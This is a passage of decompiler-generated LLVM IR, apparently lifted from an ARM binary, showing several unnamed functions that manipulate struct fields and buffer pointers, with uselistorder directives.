  store i32 %v5_16cbc, i32* %r3.global-to-local, align 4
  %v2_16cc0 = or i32 %v0_16cc0, %v5_16cbc
  store i32 %v2_16cc0, i32* %r2.global-to-local, align 4
  %v8_16cc4 = icmp eq i32 %v3_16cb4, 2147483647
  %v1_16cc8 = trunc i32 %v2_16cc0 to i16
  store i16 %v1_16cc8, i16* %v1_16c94, align 2
  br i1 %v8_16cc4, label %dec_label_pc_16cf8, label %dec_label_pc_16cd0

dec_label_pc_16cd0:                               ; preds = %bb38
  %v0_16cd0 = call i32 @function_13574()
  store i32 %v0_16cd0, i32* @r4, align 4
  %v0_16cd8 = load i32, i32* @r5, align 4
  store i32 %v0_16cd8, i32* @r0, align 4
  %v1_16cdc = inttoptr i32 %v0_16cd0 to i32*
  %v2_16cdc = load i32, i32* %v1_16cdc, align 4
  store i32 %v2_16cdc, i32* @r5, align 4
  %v1_16ce0 = call i32 @function_17ecc(i32 %v0_16cd8)
  store i32 %v1_16ce0, i32* %r0.global-to-local, align 4
  %v2_16ce4 = icmp eq i32 %v1_16ce0, 0
  br i1 %v2_16ce4, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_16cd0
  %v1_16ce8 = load i32, i32* @sb, align 4
  %v2_16ce8 = inttoptr i32 %v1_16ce8 to i16*
  %v3_16ce8 = load i16, i16* %v2_16ce8, align 2
  %v4_16ce8 = zext i16 %v3_16ce8 to i32
  %v2_16cec = or i32 %v4_16ce8, 256
  store i32 %v2_16cec, i32* %r3.global-to-local, align 4
  %v2_16cf0 = trunc i32 %v2_16cec to i16
  store i16 %v2_16cf0, i16* %v2_16ce8, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_16cd0, %bb39
  %v0_16cf4 = load i32, i32* @r5, align 4
  %v1_16cf4 = load i32, i32* @r4, align 4
  %v2_16cf4 = inttoptr i32 %v1_16cf4 to i32*
  store i32 %v0_16cf4, i32* %v2_16cf4, align 4
  br label %dec_label_pc_16cf8

dec_label_pc_16cf8:                               ; preds = %bb38, %.thread5
  %v0_16cf8 = load i32, i32* @sb, align 4
  %v1_16cf8 = add i32 %v0_16cf8, 8
  %v2_16cf8 = inttoptr i32 %v1_16cf8 to i32*
  %v3_16cf8 = load i32, i32* %v2_16cf8, align 4
  store i32 %v3_16cf8, i32* %r3.global-to-local, align 4
  %v2_16cfc = icmp eq i32 %v3_16cf8, 0
  br i1 %v2_16cfc, label %dec_label_pc_16d04, label %bb40

dec_label_pc_16d04:                               ; preds = %dec_label_pc_16cf8
  store i32 4096, i32* @r0, align 4
  %v0_16d08 = call i32 @function_13b88()
  store i32 %v0_16d08, i32* %r0.global-to-local, align 4
  %v2_16d0c = icmp eq i32 %v0_16d08, 0
  %v1_16d1c.pre = load i32, i32* @sb, align 4
  br i1 %v2_16d0c, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_16d04
  %v2_16d10 = inttoptr i32 %v1_16d1c.pre to i16*
  %v3_16d10 = load i16, i16* %v2_16d10, align 2
  %v4_16d10 = zext i16 %v3_16d10 to i32
  %v2_16d14 = add i32 %v0_16d08, 4096
  store i32 %v2_16d14, i32* %r2.global-to-local, align 4
  %v2_16d18 = or i32 %v4_16d10, 16384
  store i32 %v2_16d18, i32* %r3.global-to-local, align 4
  %v2_16d1c = add i32 %v1_16d1c.pre, 8
  %v3_16d1c = inttoptr i32 %v2_16d1c to i32*
  store i32 %v0_16d08, i32* %v3_16d1c, align 4
  %v1_16d20 = load i32, i32* %r2.global-to-local, align 4
  %v2_16d20 = load i32, i32* @sb, align 4
  %v3_16d20 = add i32 %v2_16d20, 12
  %v4_16d20 = inttoptr i32 %v3_16d20 to i32*
  store i32 %v1_16d20, i32* %v4_16d20, align 4
  %v1_16d24 = load i32, i32* %r3.global-to-local, align 4
  %v2_16d24 = trunc i32 %v1_16d24 to i16
  %v3_16d24 = load i32, i32* @sb, align 4
  %v4_16d24 = inttoptr i32 %v3_16d24 to i16*
  store i16 %v2_16d24, i16* %v4_16d24, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_16d04
  %v2_16d1c19 = add i32 %v1_16d1c.pre, 8
  %v3_16d1c20 = inttoptr i32 %v2_16d1c19 to i32*
  store i32 0, i32* %v3_16d1c20, align 4
  %v2_16d28 = load i32, i32* @sb, align 4
  %v3_16d28 = add i32 %v2_16d28, 12
  %v4_16d28 = inttoptr i32 %v3_16d28 to i32*
  store i32 0, i32* %v4_16d28, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_16cf8, %.thread9
  store i32 56, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_16d34 = load i32, i32* @fp, align 4
  %v2_16d34 = add i32 %v0_16d34, 56
  %v3_16d34 = inttoptr i32 %v2_16d34 to i32*
  %v4_16d34 = load i32, i32* %v3_16d34, align 4
  store i32 %v4_16d34, i32* %r3.global-to-local, align 4
  %v2_16d38 = load i32, i32* @sb, align 4
  %v3_16d38 = add i32 %v2_16d38, 2
  %v4_16d38 = inttoptr i32 %v3_16d38 to i8*
  store i8 0, i8* %v4_16d38, align 1
  %v0_16d3c = load i32, i32* @sb, align 4
  %v1_16d3c = inttoptr i32 %v0_16d3c to i16*
  %v2_16d3c = load i16, i16* %v1_16d3c, align 2
  %v3_16d3c = zext i16 %v2_16d3c to i32
  store i32 %v3_16d3c, i32* %r2.global-to-local, align 4
  %v0_16d40 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d40 = inttoptr i32 %v0_16d40 to i32*
  %v2_16d40 = load i32, i32* %v1_16d40, align 4
  store i32 %v2_16d40, i32* %r1.global-to-local, align 4
  %v1_16d44 = add i32 %v0_16d3c, 8
  %v2_16d44 = inttoptr i32 %v1_16d44 to i32*
  %v3_16d44 = load i32, i32* %v2_16d44, align 4
  store i32 %v3_16d44, i32* %r3.global-to-local, align 4
  %v1_16d48 = and i32 %v3_16d3c, 8192
  %v2_16d48 = icmp eq i32 %v1_16d48, 0
  %v2_16d4c = add i32 %v0_16d3c, 20
  %v3_16d4c = inttoptr i32 %v2_16d4c to i32*
  store i32 %v3_16d44, i32* %v3_16d4c, align 4
  %v0_16d50 = load i32, i32* %r0.global-to-local, align 4
  %v1_16d50 = load i32, i32* @sb, align 4
  %v2_16d50 = add i32 %v1_16d50, 44
  %v3_16d50 = inttoptr i32 %v2_16d50 to i32*
  store i32 %v0_16d50, i32* %v3_16d50, align 4
  %v0_16d54 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d54 = load i32, i32* @sb, align 4
  %v2_16d54 = add i32 %v1_16d54, 52
  %v3_16d54 = inttoptr i32 %v2_16d54 to i32*
  store i32 %v0_16d54, i32* %v3_16d54, align 4
  %v0_16d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d58 = load i32, i32* @sb, align 4
  %v2_16d58 = add i32 %v1_16d58, 24
  %v3_16d58 = inttoptr i32 %v2_16d58 to i32*
  store i32 %v0_16d58, i32* %v3_16d58, align 4
  %v0_16d5c = load i32, i32* %r3.global-to-local, align 4
  %v1_16d5c = load i32, i32* @sb, align 4
  %v2_16d5c = add i32 %v1_16d5c, 28
  %v3_16d5c = inttoptr i32 %v2_16d5c to i32*
  store i32 %v0_16d5c, i32* %v3_16d5c, align 4
  %v0_16d60 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d60 = load i32, i32* @sb, align 4
  %v2_16d60 = add i32 %v1_16d60, 16
  %v3_16d60 = inttoptr i32 %v2_16d60 to i32*
  store i32 %v0_16d60, i32* %v3_16d60, align 4
  br i1 %v2_16d48, label %dec_label_pc_16e1c, label %dec_label_pc_16d68

dec_label_pc_16d68:                               ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_16d6c = load i32, i32* @fp, align 4
  %v2_16d6c = add i32 %v0_16d6c, 36
  %v3_16d6c = inttoptr i32 %v2_16d6c to i32*
  %v4_16d6c = load i32, i32* %v3_16d6c, align 4
  store i32 %v4_16d6c, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_16d74 = add i32 %v0_16d6c, 108
  %v3_16d74 = inttoptr i32 %v2_16d74 to i32*
  %v4_16d74 = load i32, i32* %v3_16d74, align 4
  store i32 %v4_16d74, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_16d7c = ptrtoint i32* %stack_var_-56 to i32
  %v2_16d80 = add i32 %v0_16d6c, 72
  %v3_16d80 = inttoptr i32 %v2_16d80 to i32*
  %v4_16d80 = load i32, i32* %v3_16d80, align 4
  store i32 %v4_16d6c, i32* %r1.global-to-local, align 4
  store i32 %v4_16d74, i32* %r2.global-to-local, align 4
  store i32 %v2_16d7c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16d80)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_16d9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16d9c, i32* %r0.global-to-local, align 4
  %v0_16da0 = load i32, i32* @fp, align 4
  %v2_16da0 = add i32 %v0_16da0, 16
  %v3_16da0 = inttoptr i32 %v2_16da0 to i32*
  %v4_16da0 = load i32, i32* %v3_16da0, align 4
  call void @__pseudo_branch(i32 %v4_16da0)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_16db0 = load i32, i32* @fp, align 4
  %v2_16db0 = add i32 %v0_16db0, 96
  %v3_16db0 = inttoptr i32 %v2_16db0 to i32*
  %v4_16db0 = load i32, i32* %v3_16db0, align 4
  store i32 %v4_16db0, i32* %r4.global-to-local, align 4
  %v0_16db4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16db4, i32* %r1.global-to-local, align 4
  store i32 %v4_16db0, i32* %r2.global-to-local, align 4
  store i32 %v2_16b6c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16d80)
  store i32 %v4_16db0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16da0)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_16dd8 = load i32, i32* @fp, align 4
  %v2_16dd8 = add i32 %v0_16dd8, 44
  %v3_16dd8 = inttoptr i32 %v2_16dd8 to i32*
  %v4_16dd8 = load i32, i32* %v3_16dd8, align 4
  store i32 %v4_16dd8, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_16de0 = inttoptr i32 %v4_16dd8 to i32*
  %v2_16de0 = load i32, i32* %v1_16de0, align 4
  store i32 %v2_16de0, i32* %r2.global-to-local, align 4
  store i32 %v2_16b6c, i32* %r0.global-to-local, align 4
  %v1_16de8 = load i32, i32* @sb, align 4
  %v2_16de8 = add i32 %v1_16de8, 32
  %v3_16de8 = inttoptr i32 %v2_16de8 to i32*
  store i32 %v2_16de0, i32* %v3_16de8, align 4
  %v0_16dec = load i32, i32* @fp, align 4
  %v1_16dec = load i32, i32* %r3.global-to-local, align 4
  %v2_16dec = add i32 %v1_16dec, %v0_16dec
  %v3_16dec = inttoptr i32 %v2_16dec to i32*
  %v4_16dec = load i32, i32* %v3_16dec, align 4
  store i32 %v4_16dec, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16df4 = load i32, i32* @sb, align 4
  %v1_16df4 = load i32, i32* @ip, align 4
  %v2_16df4 = inttoptr i32 %v1_16df4 to i32*
  store i32 %v0_16df4, i32* %v2_16df4, align 4
  call void @__pseudo_branch(i32 %v4_16dec)
  store i32 %v2_16d7c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16dec)
  br label %dec_label_pc_16e1c

dec_label_pc_16e18:                               ; preds = %dec_label_pc_16bac, %dec_label_pc_16b98, %dec_label_pc_16bb8
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %bb40, %dec_label_pc_16bf0, %dec_label_pc_16d68, %dec_label_pc_16e18
  %v0_16e1c = load i32, i32* @sb, align 4
  store i32 %v0_16e1c, i32* %r0.global-to-local, align 4
  %v2_16e24 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16e24, i32* %r4.global-to-local, align 4
  store i32 %v6_16b58, i32* @r5, align 4
  store i32 %v9_16b58, i32* @r6, align 4
  store i32 %v18_16b58, i32* @sb, align 4
  store i32 %v24_16b58, i32* @fp, align 4
  ret i32 %v0_16e1c

; uselistorder directives
  uselistorder i32 %v1_16d1c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_16cb0, { 1, 2, 0 }
  uselistorder i32 %v0_16c7c, { 1, 0 }
  uselistorder i32 %v1_16c40, { 1, 0 }
  uselistorder i32 %v0_16c40, { 1, 0 }
  uselistorder i32 %v1_16c28, { 1, 0, 2 }
  uselistorder i32 %v1_16be0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 9, 10, 12, 11, 14, 13, 15, 16, 17, 18 }
  uselistorder i32 16384, { 43, 0, 44, 32, 61, 33, 62, 34, 63, 35, 64, 36, 65, 37, 66, 17, 67, 16, 45, 2, 47, 30, 48, 3, 59, 31, 60, 29, 46, 4, 49, 5, 50, 6, 51, 7, 52, 8, 53, 9, 54, 10, 55, 11, 56, 12, 57, 13, 58, 38, 80, 14, 81, 15, 82, 18, 68, 39, 69, 19, 70, 20, 71, 21, 72, 40, 73, 22, 1, 23, 74, 24, 75, 26, 76, 25, 77, 27, 78, 28, 79, 42, 83, 84, 85, 41, 86 }
  uselistorder i32 4096, { 8, 9, 10, 1, 0, 2, 15, 3, 11, 5, 12, 6, 4, 7, 13, 14 }
  uselistorder i32 32768, { 1, 5, 2, 0, 4, 3 }
  uselistorder i32 (i32, i32)* @function_12d24, { 8, 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @function_12f80, { 14, 0, 13, 4, 3, 6, 5, 12, 11, 10, 9, 8, 7, 2, 1 }
  uselistorder i32 1024, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 ()* @function_13b88, { 62, 61, 60, 6, 1, 0, 2, 3, 8, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 5, 4, 9, 7 }
  uselistorder i32 80, { 6, 3, 4, 5, 1, 2, 8, 7, 0, 9 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @function_14bf4, { 12, 11, 5, 4, 3, 0, 1, 8, 7, 6, 10, 9, 2 }
  uselistorder i32* @fp, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 99, 83, 84, 85, 86, 95, 97, 96, 98, 18, 19, 20, 21, 22, 28, 29, 23, 24, 25, 26, 27, 30, 31, 88, 87, 89, 90, 91, 92, 33, 34, 35, 36, 37, 38, 39, 40, 41, 32, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 93, 94 }
  uselistorder i32* @sb, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 103, 104, 105, 106, 107, 108, 109, 110, 117, 120, 118, 119, 121, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 111, 112, 113, 114, 48, 49, 50, 51, 52, 53, 54, 46, 47, 1, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 115, 116, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder label %dec_label_pc_16e1c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_16e18, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16cf8, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_16c70._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16c18, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16bc8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b98, { 1, 2, 0 }
}

define i32 @function_16e30(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16e30:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v0_16e30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16e30, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_16e30
  %v1_16e38 = load i32, i32* %r2.global-to-local, align 4
  %v2_16e38 = load i32, i32* %r3.global-to-local, align 4
  %v3_16e38 = and i32 %v2_16e38, %v1_16e38
  %v2_16e3c = trunc i32 %v3_16e38 to i16
  %v4_16e3c = inttoptr i32 %v3_16e38 to i16*
  store i16 %v2_16e3c, i16* %v4_16e3c, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_16e30, %bb
  %v0_16e64 = call i32 @function_13574()
  store i32 %v0_16e64, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_16e70 = inttoptr i32 %v0_16e64 to i32*
  %v2_16e70 = load i32, i32* %v1_16e70, align 4
  store i32 %v2_16e70, i32* @r6, align 4
  %v1_16e74 = call i32 @function_17ecc(i32 0)
  %v2_16e7c = icmp eq i32 %v1_16e74, 0
  store i32 135344, i32* @r4, align 4
  br i1 %v2_16e7c, label %bb23, label %.thread13

bb23:                                             ; preds = %.thread10
  store i32 304, i32* %r2.global-to-local, align 4
  %v5_16e88 = load i16, i16* inttoptr (i32 135648 to i16*), align 32
  %v7_16e88 = zext i16 %v5_16e88 to i32
  %v2_16e8c = xor i32 %v7_16e88, 256
  store i32 %v2_16e8c, i32* @r3, align 4
  %v2_16e90 = trunc i32 %v2_16e8c to i16
  store i16 %v2_16e90, i16* inttoptr (i32 135648 to i16*), align 32
  br label %.thread13

.thread13:                                        ; preds = %.thread10, %bb23
  store i32 1, i32* @r0, align 4
  %v1_16e98 = call i32 @function_17ecc(i32 1)
  %v2_16e9c = icmp eq i32 %v1_16e98, 0
  br i1 %v2_16e9c, label %bb24, label %.thread17

bb24:                                             ; preds = %.thread13
  %v1_16ea4 = load i32, i32* @r4, align 4
  %v3_16ea4 = add i32 %v1_16ea4, 304
  store i32 %v3_16ea4, i32* %r2.global-to-local, align 4
  %v2_16ea8 = add i32 %v1_16ea4, 384
  %v3_16ea8 = inttoptr i32 %v2_16ea8 to i16*
  %v4_16ea8 = load i16, i16* %v3_16ea8, align 2
  %v5_16ea8 = zext i16 %v4_16ea8 to i32
  %v2_16eac = xor i32 %v5_16ea8, 256
  store i32 %v2_16eac, i32* %r3.global-to-local, align 4
  %v2_16eb0 = trunc i32 %v2_16eac to i16
  store i16 %v2_16eb0, i16* %v3_16ea8, align 2
  br label %.thread17

.thread17:                                        ; preds = %.thread13, %bb24
  %v0_16eb4 = load i32, i32* @r6, align 4
  %v1_16eb4 = load i32, i32* @r5, align 4
  %v2_16eb4 = inttoptr i32 %v1_16eb4 to i32*
  store i32 %v0_16eb4, i32* %v2_16eb4, align 4
  ret i32 %v1_16e98

; uselistorder directives
  uselistorder i32 %v3_16e38, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_17ecc, { 2, 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_16ec8(i32 %arg1) local_unnamed_addr {
dec_label_pc_16ec8:
  store i32 135344, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_19088.709 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_16ee4 = call i32 @function_13680()
  ret i32 %v0_16ee4
}

define i32 @function_16fd0(i32 %arg1) local_unnamed_addr {
dec_label_pc_16fd0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16fd0 = load i32, i32* @r4, align 4
  store i32 %v3_16fd0, i32* %stack_var_-8, align 4
  %v1_16fd4 = add i32 %arg1, 8
  %v2_16fd4 = inttoptr i32 %v1_16fd4 to i32*
  %v3_16fd4 = load i32, i32* %v2_16fd4, align 4
  %v1_16fd8 = add i32 %arg1, 16
  %v2_16fd8 = inttoptr i32 %v1_16fd8 to i32*
  %v3_16fd8 = load i32, i32* %v2_16fd8, align 4
  %v9_16fdc = icmp eq i32 %v3_16fd8, %v3_16fd4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_16fdc, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_16fd0
  store i32 %v3_16fd4, i32* %v2_16fd8, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_16fd0, %bb
  %v1_16fe8 = xor i1 %v9_16fdc, true
  call void @__pseudo_cond_branch(i1 %v1_16fe8, i32 ptrtoint (i32* @global_var_182b8.710 to i32))
  %v0_16fec = load i32, i32* %r4.global-to-local, align 4
  %v1_16fec = add i32 %v0_16fec, 8
  %v2_16fec = inttoptr i32 %v1_16fec to i32*
  %v3_16fec = load i32, i32* %v2_16fec, align 4
  %v1_16ff0 = add i32 %v0_16fec, 16
  %v2_16ff0 = inttoptr i32 %v1_16ff0 to i32*
  %v3_16ff0 = load i32, i32* %v2_16ff0, align 4
  %v2_16ff4 = sub i32 %v3_16ff0, %v3_16fec
  %v2_16ff8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16ff8, i32* @r4, align 4
  ret i32 %v2_16ff4

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_17000(i32 %arg1) local_unnamed_addr {
dec_label_pc_17000:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17000 = load i32, i32* @r4, align 4
  store i32 %v3_17000, i32* %stack_var_-16, align 4
  %v6_17000 = load i32, i32* @r5, align 4
  %v12_17000 = load i32, i32* @lr, align 4
  %v1_17004 = add i32 %arg1, 52
  %v2_17004 = inttoptr i32 %v1_17004 to i32*
  %v3_17004 = load i32, i32* %v2_17004, align 4
  %v2_1700c = icmp eq i32 %v3_17004, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 135344, i32* %r6.global-to-local, align 4
  br i1 %v2_1700c, label %dec_label_pc_17044, label %dec_label_pc_17020

dec_label_pc_17020:                               ; preds = %dec_label_pc_17000
  %v1_17020 = add i32 %arg1, 16
  %v2_17020 = inttoptr i32 %v1_17020 to i32*
  %v3_17020 = load i32, i32* %v2_17020, align 4
  %v1_17024 = add i32 %arg1, 24
  %v2_17024 = inttoptr i32 %v1_17024 to i32*
  %v3_17024 = load i32, i32* %v2_17024, align 4
  %v3_17028 = icmp ult i32 %v3_17020, %v3_17024
  br i1 %v3_17028, label %.thread, label %dec_label_pc_17038

.thread:                                          ; preds = %dec_label_pc_17020
  %v2_1702c = inttoptr i32 %v3_17020 to i8*
  %v3_1702c = load i8, i8* %v2_1702c, align 1
  %v4_1702c = zext i8 %v3_1702c to i32
  store i32 %v4_1702c, i32* %r4.global-to-local, align 4
  %v6_1702c = add i32 %v3_17020, 1
  store i32 %v6_1702c, i32* %v2_17020, align 4
  br label %dec_label_pc_170b8

dec_label_pc_17038:                               ; preds = %dec_label_pc_17020
  %v1_17038 = inttoptr i32 %arg1 to i16*
  %v2_17038 = call i32 @function_1752c(i16* %v1_17038)
  store i32 %v2_17038, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_170b8

dec_label_pc_17044:                               ; preds = %dec_label_pc_17000
  %v1_17048 = add i32 %arg1, 56
  store i32 %v1_17048, i32* @r4, align 4
  %v4_1705c = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_1705c)
  %v0_17070 = load i32, i32* %r6.global-to-local, align 4
  %v2_17070 = add i32 %v0_17070, 16
  %v3_17070 = inttoptr i32 %v2_17070 to i32*
  %v4_17070 = load i32, i32* %v3_17070, align 4
  store i32 94332, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17070)
  %v0_1707c = load i32, i32* @r5, align 4
  %v1_1707c = add i32 %v0_1707c, 16
  %v2_1707c = inttoptr i32 %v1_1707c to i32*
  %v3_1707c = load i32, i32* %v2_1707c, align 4
  %v1_17080 = add i32 %v0_1707c, 24
  %v2_17080 = inttoptr i32 %v1_17080 to i32*
  %v3_17080 = load i32, i32* %v2_17080, align 4
  %v3_17084 = icmp ult i32 %v3_1707c, %v3_17080
  br i1 %v3_17084, label %.thread2, label %dec_label_pc_17094

.thread2:                                         ; preds = %dec_label_pc_17044
  %v2_17088 = inttoptr i32 %v3_1707c to i8*
  %v3_17088 = load i8, i8* %v2_17088, align 1
  %v4_17088 = zext i8 %v3_17088 to i32
  store i32 %v4_17088, i32* %r4.global-to-local, align 4
  %v6_17088 = add i32 %v3_1707c, 1
  store i32 %v6_17088, i32* %v2_1707c, align 4
  br label %dec_label_pc_170a0

dec_label_pc_17094:                               ; preds = %dec_label_pc_17044
  %v1_17098 = inttoptr i32 %v0_1707c to i16*
  %v2_17098 = call i32 @function_1752c(i16* %v1_17098)
  store i32 %v2_17098, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_170a0

dec_label_pc_170a0:                               ; preds = %.thread2, %dec_label_pc_17094
  %v0_170ac = load i32, i32* %r6.global-to-local, align 4
  %v2_170ac = add i32 %v0_170ac, 24
  %v3_170ac = inttoptr i32 %v2_170ac to i32*
  %v4_170ac = load i32, i32* %v3_170ac, align 4
  store i32 %v4_170ac, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_170ac)
  br label %dec_label_pc_170b8

dec_label_pc_170b8:                               ; preds = %.thread, %dec_label_pc_17038, %dec_label_pc_170a0
  %v0_170b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_170c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_170c0, i32* @r4, align 4
  store i32 %v6_17000, i32* @r5, align 4
  store i32 %v12_17000, i32* @lr, align 4
  ret i32 %v0_170b8

; uselistorder directives
  uselistorder i32 %v3_1707c, { 1, 0, 2 }
  uselistorder i32 %v3_17020, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 4, 5, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_170b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_170a0, { 1, 0 }
}

define i32 @function_170cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_170cc:
  %v0_170cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_170cc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_170cc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_170cc, %bb
  %v10_170d8 = phi i32 [ %arg1, %dec_label_pc_170cc ], [ 0, %bb ]
  ret i32 %v10_170d8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_170dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_170dc:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_170dc = load i32, i32* @r4, align 4
  store i32 %v3_170dc, i32* %stack_var_-28, align 4
  %v6_170dc = load i32, i32* @r5, align 4
  %v9_170dc = load i32, i32* @r6, align 4
  %v12_170dc = load i32, i32* @r7, align 4
  %v21_170dc = load i32, i32* @lr, align 4
  %v1_170e0 = add i32 %arg3, 52
  %v2_170e0 = inttoptr i32 %v1_170e0 to i32*
  %v3_170e0 = load i32, i32* %v2_170e0, align 4
  %v1_170e8 = sub i32 1, %v3_170e0
  %v2_170e8 = icmp ult i32 %v3_170e0, 2
  br i1 %v2_170e8, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_170dc
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_170dc, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_170e8, %dec_label_pc_170dc ]
  %v0_170f0 = phi i32 [ 0, %bb ], [ %v1_170e8, %dec_label_pc_170dc ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_170f0 = icmp eq i32 %v0_170f0, 0
  store i32 135344, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_170f0, label %dec_label_pc_17144, label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %bb16
  %v1_17110 = add i32 %arg3, 56
